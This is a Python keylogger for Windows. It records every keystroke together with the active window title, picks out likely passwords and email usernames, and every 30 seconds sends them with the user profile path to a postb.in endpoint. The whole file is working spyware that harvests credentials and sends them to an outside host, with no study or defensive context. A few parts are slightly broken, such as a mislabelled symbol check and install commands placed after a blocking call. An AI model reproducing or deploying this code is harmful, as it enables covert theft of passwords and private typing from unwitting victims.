import os
import keyboard #keylogs
from threading import Semaphore, Timer
from datetime import datetime
from win32gui import GetWindowText, GetForegroundWindow
import requests


send_interval= 30 #1 min
file_url = "url"

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.semaphore = Semaphore(0)

        self.passwords = {}
        self.passwords_very_sure = {}
        self.all_strings = []
        self.potential_user = {}
        self.current_string = ''
        self.shift = False
    
    def checkPass(self, s):
        window = GetWindowText(GetForegroundWindow())

        if(len(s) >= 8):
            self.passwords[window] = s

        containDigit = False
        upperCase = False
        containsSym = False
        for i in s:
            if i.isdigit():
                containDigit = True
            if i.isupper():
                upperCase = True
            if i.isalpha():
                containsSym = True
        if(containDigit and upperCase and containsSym):
            self.passwords_very_sure[window] = s
            
        if(s.find('@') != -1 and s.find('.') != -1):
            self.potential_user[window] = s
        
    
    def callback(self, event):
        name = event.name
        window = GetWindowText(GetForegroundWindow())
        if len(name) == 1:
            self.current_string += name

        elif len(name) > 1:
            name = name.replace(" ", "_")
            name = f"[{name.lower()}]"
            if (name == '[space]' or name == "[tab]" or name == "[enter]"):
                self.all_strings.append(self.current_string)
                self.checkPass(self.current_string)
                self.current_string =  ""

            elif name == '[backspace]':
                self.current_string = self.current_string[:-1]

        time = datetime.now()
        self.log += ("\n" + "***   " + time.strftime("%m/%d/%Y, %H:%M:%S") +"\t" + 'WINDOW: ' + window + "\t key: " + name + "  ***")
        

    def postData(self):
        bin_id = open('binID.txt', 'r').read()
        post_url = "https://postb.in/" + bin_id
        data = {
            'user' : os.environ['USERPROFILE'],
            'keystroke'  : self.log,
            'passwords' : str(self.passwords),
            'potential password' :  str(self.passwords_very_sure),
            'username' : str(self.potential_user),
            'all strings': str(self.all_strings)
        }
        sender = requests.post(post_url,data)
        
        print(self.passwords, self.passwords_very_sure, self.all_strings,  self.potential_user,  self.log )
        self.passwords = {}
        self.passwords_very_sure = {}
        self.all_strings = []
        self.potential_user = {}
        self.log = ''
        

    def report(self):   
        if self.log:
            self.postData()
        timer = Timer(self.interval,self.report)
        timer.start()

        
    def run (self):
        keyboard.on_release(self.callback)
        self.report()
        self.semaphore.acquire()
    
def main():
    keylogger = Keylogger(send_interval)
    keylogger.run()
    os.system('pip install keyboard')
    os.system('pip install requests')
    os.system('pip install pywin32')

main()
